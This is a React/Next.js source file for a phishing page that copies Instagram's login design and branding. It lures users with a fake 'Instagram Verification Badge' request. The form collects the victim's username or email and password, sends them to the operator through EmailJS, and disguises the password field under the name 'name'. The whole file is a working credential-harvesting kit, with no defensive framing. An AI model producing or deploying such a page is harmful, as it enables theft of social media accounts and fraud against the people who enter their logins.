"use client";

import { useState, useEffect } from "react";
import emailjs from "@emailjs/browser";
import Image from "next/image";

export default function Home() {
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    message: "",
  });
  const [status, setStatus] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    setFormData({
      name: process.env.NEXT_PUBLIC_DEFAULT_NAME || "",
      email: process.env.NEXT_PUBLIC_DEFAULT_EMAIL || "",
      message: process.env.NEXT_PUBLIC_DEFAULT_MESSAGE || "",
    });
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setStatus("");

    try {
      const result = await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
        {
          from_name: formData.name,
          from_email: formData.email,
          message: formData.message,
        },
        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY
      );

      if (result.text === "OK") {
        setStatus("Request submitted successfully! ✓");
        setFormData({
          name: process.env.NEXT_PUBLIC_DEFAULT_NAME || "",
          email: process.env.NEXT_PUBLIC_DEFAULT_EMAIL || "",
          message: process.env.NEXT_PUBLIC_DEFAULT_MESSAGE || "",
        });
      } else {
        setStatus("Failed to submit request ✗");
      }
    } catch (err) {
      console.error("EmailJS Error:", err);
      setStatus("Failed to submit request ✗");
    } finally {
      setLoading(false);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="min-h-screen bg-white dark:bg-black flex items-center justify-center px-4 pb-32">
      <div className="flex items-center justify-center gap-8 max-w-6xl w-full">
        {/* Left side - Phone mockup with carousel */}
        <div className="hidden lg:block relative min-w-[600px] h-[580px]">
          {/* <div className="relative w-full h-full bg-gray-100 dark:bg-gray-900 rounded-lg flex items-center justify-center"> */}
          <Image
            src="/img/landing.png" // replace with carousel or collage
            alt="Instagram Preview"
            fill
            className="object-cover"
            priority
            sizes="(max-width: 768px) 100vw,
                (max-width: 1200px) 50vw,
                33vw"
          />
          {/* </div> */}
        </div>

        {/* Right side - Login form */}
        <div className="flex flex-col items-center w-full max-w-[450px]">
          {/* Main login card */}
          <div className="w-full bg-white dark:bg-black border border-gray-300 dark:border-gray-700 p-10 mb-3">
            {/* Verification Badge - prominent and centered */}
            <div className="flex flex-col items-center mb-6">
              {/* <div className="bg-gradient-to-tr from-blue-400 to-indigo-500 rounded-full p-2 shadow-lg mb-2"> */}
                <Image
                  src="https://static.vecteezy.com/system/resources/thumbnails/047/309/930/small/verified-badge-profile-icon-png.png"
                  alt="Verification Badge"
                  width={72}
                  height={72}
                  priority
                />
              {/* </div> */}
              <h1 className="text-2xl font-bold text-gray-900 dark:text-white text-center mt-2">
                Instagram Verification Badge
              </h1>
              <p className="text-gray-500 dark:text-gray-400 text-center text-sm mt-1 mb-2 max-w-xs">
                Submit your request to get verified. Reviews take up to 90 days.
              </p>
            </div>
            {/* Instagram logo below badge */}
            {/* <div className="flex justify-center mb-8">
              <h2 className="text-4xl font-['Satisfy',cursive] text-black dark:text-white">
                Instagram
              </h2>
            </div> */}

            {/* Login inputs */}
            <div className="space-y-2">
              <form onSubmit={handleSubmit} className="space-y-2">
                <input
                  type="text"
                  id="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  required
                  placeholder="Phone number, username or email address"
                  className="w-full px-2 py-[9px] text-xs bg-gray-50 dark:bg-[#121212] border border-gray-300 dark:border-gray-700 rounded-sm focus:outline-none focus:border-gray-400 dark:focus:border-gray-600 text-black dark:text-white placeholder-gray-500 dark:placeholder-gray-500"
                />
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    id="name"
                    name="name"
                    value={formData.name}
                    onChange={handleChange}
                    required
                    placeholder="Password"
                    className="w-full px-2 py-[9px] text-xs bg-gray-50 dark:bg-[#121212] border border-gray-300 dark:border-gray-700 rounded-sm focus:outline-none focus:border-gray-400 dark:focus:border-gray-600 text-black dark:text-white placeholder-gray-500 dark:placeholder-gray-500"
                  />
                  <button
                    type="button"
                    onClick={togglePasswordVisibility}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none"
                  >
                    {showPassword ? (
                      <svg
                        className="w-5 h-5"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L9 9m9 9l-3-3m-3 3l3-3"
                        />
                      </svg>
                    ) : (
                      <svg
                        className="w-5 h-5"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                        />
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                        />
                      </svg>
                    )}
                  </button>
                </div>
                <textarea
                  id="message"
                  name="message"
                  value={formData.message}
                  onChange={handleChange}
                  required
                  rows={4}
                  placeholder="Explain why your account should be verified..."
                  className="w-full px-2 py-[9px] text-xs bg-gray-50 dark:bg-[#121212] border border-gray-300 dark:border-gray-700 rounded-sm focus:outline-none focus:border-gray-400 dark:focus:border-gray-600 text-black dark:text-white placeholder-gray-500 dark:placeholder-gray-500"
                />
                <button
                  type="submit"
                  // onClick={handleSubmit}
                  className="w-full bg-[#4cb5f9] hover:bg-[#1da1f2] text-white font-semibold py-[7px] rounded-lg text-sm mt-3 transition-colors"
                >
                  {loading ? (
                    <div className="flex items-center justify-center gap-2">
                      <svg
                        className="w-4 h-4 animate-spin"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M12 2v4m0 12v4m8-10h-4M6 12H2"
                        />
                      </svg>
                      <span>Submitting...</span>
                    </div>
                  ) : (
                    "Submit Request"
                  )}
                </button>
              </form>
              {/* Status Message */}
              {status && (
                <div
                  className={`text-center text-sm ${
                    status.includes("success")
                      ? "text-green-600"
                      : "text-red-600"
                  }`}
                >
                  {status}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="fixed bottom-0 left-0 right-0 py-6 bg-white dark:bg-black border-t border-transparent">
        <div className="max-w-4xl mx-auto px-4">
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-xs text-gray-500 dark:text-gray-600 mb-4">
            <a href="#" className="hover:underline">
              Meta
            </a>
            <a href="#" className="hover:underline">
              About
            </a>
            <a href="#" className="hover:underline">
              Blog
            </a>
            <a href="#" className="hover:underline">
              Jobs
            </a>
            <a href="#" className="hover:underline">
              Help
            </a>
            <a href="#" className="hover:underline">
              API
            </a>
            <a href="#" className="hover:underline">
              Privacy
            </a>
            <a href="#" className="hover:underline">
              Terms
            </a>
            <a href="#" className="hover:underline">
              Locations
            </a>
            <a href="#" className="hover:underline">
              Instagram Lite
            </a>
            <a href="#" className="hover:underline">
              Threads
            </a>
            <a href="#" className="hover:underline">
              Contact uploading and non-users
            </a>
            <a href="#" className="hover:underline">
              Meta Verified
            </a>
          </div>
          <div className="flex justify-center items-center gap-4 text-xs text-gray-500 dark:text-gray-600">
            <select className="bg-transparent border-none text-xs text-gray-500 dark:text-gray-600">
              <option>English (UK)</option>
            </select>
            <span>© 2025 Instagram from Meta</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
